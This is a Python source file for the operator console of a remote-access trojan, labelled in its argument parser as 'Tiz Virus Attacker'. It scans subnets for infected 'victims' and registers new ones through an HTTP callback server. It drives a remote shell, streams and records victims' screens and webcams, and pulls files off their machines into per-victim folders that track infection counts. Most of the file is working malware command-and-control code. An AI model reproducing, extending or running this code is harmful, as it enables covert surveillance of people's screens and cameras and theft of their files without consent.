# -*- coding: utf-8 -*-
"""
Created on Dec 23 2020

@autor Tiz
"""
import pygame
import socket
import argparse
import sys
import threading
import queue
from concurrent.futures import ThreadPoolExecutor
from threading import Lock
import ipaddress
import time
import os
import cv2
from datetime import datetime

from ui.components.colors import *
from ui.components.display import Display
from ui.components.button import Button
from ui.components.input_box import InputBox
from ui.handlers.screen_handler import screenreceiver
from ui.handlers.camera_handler import camerareceiver
from ui.handlers.file_handler import receive_file
from ui.utils.network import R_tcp
from ui.utils.host_manager import HostManager
from http.server import HTTPServer, BaseHTTPRequestHandler
import json

# Initialize Pygame
pygame.init()

# Set up display
WIDTH, HEIGHT = 1024, 768
screen = pygame.display.set_mode((WIDTH, HEIGHT))
pygame.display.set_caption("Remote Desktop Menu")

# Font
font = pygame.font.Font(None, 36)

# Update the network-related constants
NETWORK_RANGES = [
    "10.0.2",  # VirtualBox default NAT
    "192.168.56",
]

VICTIM_IPS = ['192.168.1.15']

# Thread pool for background tasks
thread_pool = ThreadPoolExecutor(max_workers=4)

# Add to global variables
host_manager = HostManager()

SCAN_INTERVAL = 5  # Seconds between scans
COMMON_PORTS = [5000, 5001, 5002, 5003]  # Ports to check for victims


class HostNotificationHandler(BaseHTTPRequestHandler):
    def do_POST(self):
        if self.path == '/new_victim':
            try:
                content_length = int(self.headers['Content-Length'])
                post_data = self.rfile.read(content_length)
                data = json.loads(post_data.decode('utf-8'))

                if 'victim_ip' in data:
                    new_victim = data['victim_ip']
                    print(f"New victim connected: {new_victim}")
                    
                    # Add to discovered hosts and VICTIM_IPS if not already present
                    ui_state.discovered_hosts.add(new_victim)
                    if new_victim not in VICTIM_IPS:
                        VICTIM_IPS.append(new_victim)
                        
                    # Save the host with full information and create folder structure
                    victim_dir = host_manager.create_victim_folder(new_victim)
                    host_manager.add_host(
                        new_victim, 
                        ports=data.get('ports', {
                            'shell': 5000,
                            'screen': 5001,
                            'camera': 5002
                        })
                    )
                    
                    print(f"Created victim directory: {victim_dir}")
                    
                    # Set initial status to Reachable for new victim
                    ui_state.victims_status[new_victim] = "Reachable"
                    
                    # Force UI update in a thread-safe way using custom event
                    NEW_VICTIM_EVENT = pygame.USEREVENT + 1
                    pygame.event.post(pygame.event.Event(NEW_VICTIM_EVENT))

                self.send_response(200)
                self.end_headers()
                
            except Exception as e:
                print(f"Error handling new victim notification: {e}")
                self.send_response(500)
                self.end_headers()


def start_notification_server():
    server = HTTPServer(('0.0.0.0', 8080), HostNotificationHandler)
    server.serve_forever()


def update_displays():
    """Update displays when new hosts are discovered."""
    global displays
    current_ips = [d.text for d in displays]

    # Add new displays for discovered hosts
    for host in ui_state.discovered_hosts:
        if host not in current_ips:
            row = len(displays) // 3
            col = len(displays) % 3
            x = 50 + col * 250
            y = 50 + row * 200
            displays.append(Display(x, y, 200, 150, host, font))
            # Set status to Reachable for new display
            ui_state.victims_status[host] = "Reachable"
            # Update max scroll height
            ui_state.max_scroll_y = max(0, (len(displays) // 3) * 200 + 50 - HEIGHT)


class UIState:
    def __init__(self):
        self.scroll_y = 0
        self.max_scroll_y = 0
        self.full_screen = False
        self.camera_running = False
        self.screen_running = False
        self.file_sending = False
        self.victims_status = {ip: "Not reachable" for ip in VICTIM_IPS}
        self.running = True
        self.discovered_hosts = set()
        self.active_receivers = {}  # Track active receivers by host
        self.file_threads = {}  # Track file transfer threads

    def cleanup_host_connections(self, host):
        """Clean up all connections for a specific host"""
        if host in self.active_receivers:
            receivers = self.active_receivers[host]
            if 'camera' in receivers:
                receivers['camera'].stop()
            if 'screen' in receivers:
                receivers['screen'].stop()
            del self.active_receivers[host]
        
        if host in self.file_threads:
            self.file_threads[host].cancel()
            del self.file_threads[host]


ui_state = UIState()


def parseargs():
    cli_args = argparse.ArgumentParser(description="Tiz Virus Attacker")
    cli_args.add_argument('--port',
                          help="default port is 5000, revershell = port, camera stream = port+1, screen stream = port+2",
                          default=5000, type=int)
    options = cli_args.parse_args(sys.argv[1:])
    options.hosts = VICTIM_IPS
    return options


# Create initial displays
displays = [
    Display(50, 50, 200, 150, VICTIM_IPS[0], font),
]

# Create buttons
add_button = Display(WIDTH - 100, HEIGHT - 100, 80, 80, "+", font)
back_button = Display(10, 10, 100, 50, "Back", font)


def create_new_display():
    num_displays = len(displays)
    row = num_displays // 3
    col = num_displays % 3
    x = 50 + col * 250
    y = 50 + row * 200
    return Display(x, y, 200, 150, f"Display {num_displays + 1}", font)


def check_single_victim(host, port):
    """Check if a host is reachable on the given port."""
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(1.0)  # Increase timeout for better reliability
            result = s.connect_ex((host, port))
            if result == 0:
                # Keep connection alive with small data exchange
                try:
                    s.send(b"ping")
                    s.recv(1024)
                except:
                    return False
                return True
    except:
        pass
    return False


def status_checker_thread(options):
    """Check status of all known victims including newly discovered ones."""
    while ui_state.running:
        try:
            # Update status for all known hosts
            for host in list(ui_state.discovered_hosts):  # Use list to avoid modification during iteration
                try:
                    # Only check shell port (5000) for status
                    if check_single_victim(host, options.port):
                        status = "Reachable"
                    else:
                        status = "Not reachable"
                        # Try to reconnect if status is not reachable
                        if status == "Not reachable" and host in ui_state.victims_status and ui_state.victims_status[host] == "Reachable":
                            print(f"Lost connection to {host}, attempting to reconnect...")
                            # Try to reconnect through the shell port
                            if check_single_victim(host, options.port):
                                status = "Reachable"
                                print(f"Successfully reconnected to {host}")
                    
                    # Update both UI state and host manager
                    ui_state.victims_status[host] = status
                    host_manager.update_host_status(host, status)
                    
                except Exception as e:
                    print(f"Error checking host {host}: {e}")
                    ui_state.victims_status[host] = "Not reachable"
                    host_manager.update_host_status(host, "Not reachable")

        except Exception as e:
            print(f"Error in status checker: {e}")

        time.sleep(1)  # Check more frequently


def draw_static_frame(surface, frame_rect, border_color=(0, 0, 0), border_width=2):
    """Vẽ khung tĩnh không thay đổi."""
    pygame.draw.rect(surface, border_color, frame_rect, border_width)


def send_record_command_async(host, port, command, save_path, button, recording_type):
    """Send recording command to victim and receive recorded file asynchronously"""
    def record_task():
        try:
            # Send command through shell connection
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.connect((host, port))
                s.send(command.encode())
                response = s.recv(1024).decode()
                print(f"Record command response: {response}")
                
                if "started" in response.lower():
                    # Wait for recording duration (60s) plus some buffer
                    time.sleep(65)  
                    
                    # Wait for completion message
                    completion = s.recv(1024).decode()
                    if "completed" in completion.lower():
                        print("Recording completed, receiving file...")
                        # Start file receiver
                        save_dir = os.path.dirname(save_path)
                        future = thread_pool.submit(
                            receive_file,
                            "0.0.0.0",
                            port + 3,  # File transfer port
                            save_dir
                        )
                        def file_callback(future):
                            try:
                                result = future.result()
                                if result:
                                    print(f"Successfully received recorded file at {save_path}")
                                else:
                                    print("Failed to receive recorded file")
                            except Exception as e:
                                print(f"Error receiving file: {e}")
                            finally:
                                # Reset button text when done
                                if recording_type == 'screen':
                                    button.text = "Record Screen"
                                else:
                                    button.text = "Record Camera"
                        future.add_done_callback(file_callback)
                        return True
                return False
        except Exception as e:
            print(f"Error in record command: {e}")
            return False
        finally:
            # Reset button text if something went wrong
            if recording_type == 'screen':
                button.text = "Record Screen"
            else:
                button.text = "Record Camera"

    # Start recording in background thread
    thread = threading.Thread(target=record_task)
    thread.daemon = True
    thread.start()


def show_full_screen(display, options):
    full_screen = True
    host = display.text
    host_info = host_manager.get_host_info(host)
    
    # Use stored port information if available
    if host_info and 'ports' in host_info:
        ports = host_info['ports']
        shell_port = ports.get('shell', options.port)
        screen_port = ports.get('screen', options.port + 1)
        camera_port = ports.get('camera', options.port + 2)
    else:
        shell_port = options.port
        screen_port = options.port + 1
        camera_port = options.port + 2

    # Get victim's data directory
    victim_dir = host_manager.get_victim_folder(host) if host_info else None
    input_box_width = 1000
    input_box_x = (WIDTH - input_box_width) // 2  
    # input_box = InputBox(, HEIGHT // 2 + 200, input_box_width, 100, host)
    input_box = InputBox(input_box_x, HEIGHT // 2 + 260, input_box_width, 130, host)
    camera_button = Button(WIDTH // 4 - 100, HEIGHT // 2 + 200, 190, 50, "Start Camera", GREEN)
    screen_button = Button(3 * WIDTH // 4 - 100, HEIGHT // 2 + 200, 190, 50, "Start Screen", BLUE)
    file_button = Button(WIDTH // 2 - 100, HEIGHT // 2 + 200, 190, 50, "Receive File", RED)
    
    # Add record buttons
    record_screen_button = Button(3 * WIDTH // 4 - 100, HEIGHT // 2 + 160, 190, 40, "Record Screen", RED)
    record_camera_button = Button(WIDTH // 4 - 100, HEIGHT // 2 + 160, 190, 40, "Record Camera", RED)

    if host not in ui_state.active_receivers:
        ui_state.active_receivers[host] = {}

    # Show host information
    if host_info:
        info_text = [
            f"First seen: {host_info['first_seen'].split('T')[0]}",
            f"Infections: {host_info['infection_count']}",
            f"Status: {host_info['status']}"
        ]
    else:
        info_text = ["No detailed information available"]

    clock = pygame.time.Clock()
    recording = False
    recording_start_time = None
    video_writer = None
    recording_type = None  # 'screen' or 'camera'

    try:
        while full_screen and pygame.display.get_init():
            for event in pygame.event.get():
                if event.type == pygame.QUIT:
                    full_screen = False
                    break
                input_box.handle_event(event, options.port)

                if event.type == pygame.MOUSEBUTTONDOWN:
                    if event.button == 1:
                        if back_button.rect.collidepoint(event.pos):
                            if recording:
                                # Stop recording before closing
                                if video_writer is not None:
                                    video_writer.release()
                            full_screen = False
                        elif camera_button.rect.collidepoint(event.pos):
                            if camera_button.text == "Start Camera":
                                camera_button.text = "Stop Camera"
                                ui_state.active_receivers[host]['camera'] = camerareceiver(host, camera_port)
                            else:
                                camera_button.text = "Start Camera"
                                if 'camera' in ui_state.active_receivers[host]:
                                    ui_state.active_receivers[host]['camera'].stop()
                                    del ui_state.active_receivers[host]['camera']
                        elif screen_button.rect.collidepoint(event.pos):
                            if screen_button.text == "Start Screen":
                                screen_button.text = "Stop Screen"
                                ui_state.active_receivers[host]['screen'] = screenreceiver(host, screen_port)
                            else:
                                screen_button.text = "Start Screen"
                                if 'screen' in ui_state.active_receivers[host]:
                                    ui_state.active_receivers[host]['screen'].stop()
                                    del ui_state.active_receivers[host]['screen']
                        elif record_screen_button.rect.collidepoint(event.pos):
                            if not recording and screen_button.text == "Stop Screen":
                                record_screen_button.text = "Recording..."
                                recording = True
                                recording_type = 'screen'
                                recording_start_time = time.time()
                                
                                # Send record command to victim asynchronously
                                if victim_dir:
                                    timestamp = time.strftime("%Y%m%d_%H%M%S")
                                    video_filename = f"screen_record_{timestamp}.avi"
                                    video_path = os.path.join(victim_dir, 'videos', 'screen', video_filename)
                                    command = f"record_screen 60 {video_filename}"
                                    send_record_command_async(host, shell_port, command, video_path, record_screen_button, 'screen')
                                    
                            elif recording and recording_type == 'screen':
                                record_screen_button.text = "Record Screen"
                                recording = False
                                
                        elif record_camera_button.rect.collidepoint(event.pos):
                            if not recording and camera_button.text == "Stop Camera":
                                record_camera_button.text = "Recording..."
                                recording = True
                                recording_type = 'camera'
                                recording_start_time = time.time()
                                
                                # Send record command to victim asynchronously
                                if victim_dir:
                                    timestamp = time.strftime("%Y%m%d_%H%M%S")
                                    video_filename = f"camera_record_{timestamp}.avi"
                                    video_path = os.path.join(victim_dir, 'videos', 'camera', video_filename)
                                    command = f"record_camera 60 {video_filename}"
                                    send_record_command_async(host, shell_port, command, video_path, record_camera_button, 'camera')
                                    
                            elif recording and recording_type == 'camera':
                                record_camera_button.text = "Record Camera"
                                recording = False

                        elif file_button.rect.collidepoint(event.pos):
                            if file_button.text == "Receive File":
                                file_button.text = "Receiving..."
                                # Use victim-specific directory for file storage
                                save_dir = victim_dir if victim_dir else 'received_files'
                                # Use ThreadPoolExecutor for file transfers
                                future = thread_pool.submit(
                                    receive_file, 
                                    "0.0.0.0", 
                                    options.port + 3, 
                                    save_dir
                                )
                                ui_state.file_threads[host] = future
                                def file_callback(future):
                                    try:
                                        future.result()
                                    finally:
                                        file_button.text = "Receive File"
                                        if host in ui_state.file_threads:
                                            del ui_state.file_threads[host]
                                future.add_done_callback(file_callback)

            try:
                # Create a temporary surface for compositing
                temp_surface = pygame.Surface((WIDTH, HEIGHT))
                temp_surface.fill(WHITE)
                
                # Draw frame first
                frame_rect = pygame.Rect(WIDTH // 2 - 400, HEIGHT // 2 - 300, 800, 450)
                draw_static_frame(temp_surface, frame_rect)

                # Draw video content
                if 'screen' in ui_state.active_receivers[host]:
                    screen_receiver = ui_state.active_receivers[host]['screen']
                    if screen_receiver and screen_receiver.double_buffer:
                        # Use hardware-accelerated blitting if available
                        temp_surface.blit(screen_receiver.double_buffer, frame_rect)
                        # Record frame if recording screen
                        if recording and recording_type == 'screen' and video_writer is not None:
                            try:
                                # Convert pygame surface to OpenCV format more efficiently
                                frame = pygame.surfarray.pixels3d(screen_receiver.double_buffer)
                                frame = frame.transpose([1, 0, 2])
                                frame = cv2.cvtColor(frame, cv2.COLOR_RGB2BGR)
                                video_writer.write(frame)
                                # Release surface lock
                                del frame
                            except Exception as e:
                                print(f"Error recording frame: {e}")
                elif 'camera' in ui_state.active_receivers[host]:
                    camera_receiver = ui_state.active_receivers[host]['camera']
                    if camera_receiver and camera_receiver.double_buffer:
                        # Use hardware-accelerated blitting if available
                        temp_surface.blit(camera_receiver.double_buffer, frame_rect)
                        # Record frame if recording camera
                        if recording and recording_type == 'camera' and video_writer is not None:
                            try:
                                # Convert pygame surface to OpenCV format more efficiently
                                frame = pygame.surfarray.pixels3d(camera_receiver.double_buffer)
                                frame = frame.transpose([1, 0, 2])
                                frame = cv2.cvtColor(frame, cv2.COLOR_RGB2BGR)
                                video_writer.write(frame)
                                # Release surface lock
                                del frame
                            except Exception as e:
                                print(f"Error recording frame: {e}")
                else:
                    text_surface = font.render(f"Full Screen: {display.text}", True, BLACK)
                    text_rect = text_surface.get_rect(center=(WIDTH // 2, HEIGHT // 4))
                    temp_surface.blit(text_surface, text_rect)

                # Draw UI elements on temp surface
                input_box.draw(temp_surface)
                camera_button.draw(temp_surface)
                screen_button.draw(temp_surface)
                file_button.draw(temp_surface)
                record_screen_button.draw(temp_surface)
                record_camera_button.draw(temp_surface)
                back_button.draw(temp_surface, 0, HEIGHT)

                # Draw recording time if recording
                if recording and recording_start_time:
                    elapsed_time = int(time.time() - recording_start_time)
                    time_text = f"Recording: {elapsed_time//60:02d}:{elapsed_time%60:02d}"
                    time_surface = font.render(time_text, True, RED)
                    temp_surface.blit(time_surface, (WIDTH//2 - 100, 20))

                # Final blit to screen
                screen.blit(temp_surface, (0, 0))
                pygame.display.flip()

                # Limit update rate
                clock.tick_busy_loop(60)

            except pygame.error as e:
                print(f"Pygame error: {e}")
                break

    finally:
        # Clean up all connections for this host
        ui_state.cleanup_host_connections(host)
        # Make sure to release video writer
        if video_writer is not None:
            video_writer.release()


class NetworkScanner:
    def __init__(self):
        self.victims = set()
        self.lock = Lock()
        self.running = True
        
    def scan_host(self, ip, port):
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(0.5)
                if s.connect_ex((str(ip), port)) == 0:
                    return True
        except:
            pass
        return False
    
    def scan_network(self):
        """Scan common VM network ranges for victims"""
        while self.running:
            new_victims = set()
            
            for network in NETWORK_RANGES:
                try:
                    network_addr = ipaddress.IPv4Network(f"{network}.0/24")
                    for ip in network_addr.hosts():
                        # Check if host responds on main port (5000)
                        if self.scan_host(ip, COMMON_PORTS[0]):
                            # Verify it's a victim by checking other ports
                            if all(self.scan_host(ip, port) for port in COMMON_PORTS[1:]):
                                new_victims.add(str(ip))
                                # Update status immediately when victim is found
                                ui_state.victims_status[str(ip)] = "Reachable"
                except Exception as e:
                    print(f"Error scanning network {network}: {e}")
            
            with self.lock:
                # Update victims list
                if new_victims:
                    self.victims.update(new_victims)
                    # Update VICTIM_IPS and trigger display update
                    for victim in new_victims:
                        if victim not in VICTIM_IPS:
                            VICTIM_IPS.append(victim)
                            ui_state.discovered_hosts.add(victim)
                    
            time.sleep(SCAN_INTERVAL)

    def start(self):
        self.scan_thread = threading.Thread(target=self.scan_network, daemon=True)
        self.scan_thread.start()
        
    def stop(self):
        self.running = False
        if hasattr(self, 'scan_thread'):
            self.scan_thread.join(timeout=1.0)


def main():
    global options
    options = parseargs()

    # Define custom events
    NEW_VICTIM_EVENT = pygame.USEREVENT + 1

    # Initialize network scanner
    scanner = NetworkScanner()
    scanner.start()

    # Start notification server
    notification_thread = threading.Thread(target=start_notification_server, daemon=True)
    notification_thread.start()

    # Initialize main victim folder and add to host manager
    main_victim = VICTIM_IPS[0]  # Get the main victim IP
    victim_dir = host_manager.create_victim_folder(main_victim)
    host_manager.add_host(
        main_victim,
        ports={
            'shell': options.port,
            'screen': options.port + 1,
            'camera': options.port + 2
        }
    )
    print(f"Created main victim directory: {victim_dir}")
    ui_state.discovered_hosts.add(main_victim)

    # Initialize displays with saved hosts
    saved_hosts = host_manager.get_hosts()
    for host in saved_hosts:
        ui_state.discovered_hosts.add(host)
    update_displays()

    # Start status checker thread
    status_thread = threading.Thread(target=status_checker_thread, args=(options,), daemon=True)
    status_thread.start()

    clock = pygame.time.Clock()

    try:
        while ui_state.running:
            for event in pygame.event.get():
                if event.type == pygame.QUIT:
                    ui_state.running = False
                    pygame.quit()
                    sys.exit()
                elif event.type == NEW_VICTIM_EVENT:
                    update_displays()  # Update UI when new victim connects
                elif event.type == pygame.MOUSEBUTTONDOWN:
                    if event.button == 1:
                        for display in displays:
                            if display.rect.collidepoint(event.pos[0], event.pos[1] + ui_state.scroll_y):
                                show_full_screen(display, options)
                        if add_button.rect.collidepoint(event.pos):
                            new_display = create_new_display()
                            displays.append(new_display)
                            ui_state.max_scroll_y = max(0, (len(displays) // 3) * 200 + 50 - HEIGHT)
                    elif event.button == 4:  # Scroll up
                        ui_state.scroll_y = max(0, ui_state.scroll_y - 20)
                    elif event.button == 5:  # Scroll down
                        ui_state.scroll_y = min(ui_state.max_scroll_y, ui_state.scroll_y + 20)

            screen.fill(WHITE)

            for display in displays:
                display.draw(screen, ui_state.scroll_y, HEIGHT)

            add_button.draw(screen, 0, HEIGHT)

            # Draw status indicators for all discovered victims
            for i, display in enumerate(displays):
                ip = display.text
                status = ui_state.victims_status.get(ip, "Not reachable")
                # Calculate position relative to the display
                x = display.rect.x + display.rect.width - 30  # 30 pixels from right edge
                y = display.rect.y + 10  # 10 pixels from top
                # Adjust y position by scroll offset
                y_adjusted = y - ui_state.scroll_y
                if status == "Reachable":
                    status_button = Button(x, y, 20, 20, "", GREEN)
                else:
                    status_button = Button(x, y, 20, 20, "", RED)
                status_button.draw(screen, ui_state.scroll_y)

            pygame.display.flip()
            clock.tick(60)

    finally:
        # Clean up all active connections
        for host in list(ui_state.active_receivers.keys()):
            ui_state.cleanup_host_connections(host)
        
        # Shutdown thread pool
        thread_pool.shutdown(wait=False)
        
        scanner.stop()
        ui_state.running = False
        pygame.quit()
        sys.exit()


if __name__ == "__main__":
    main()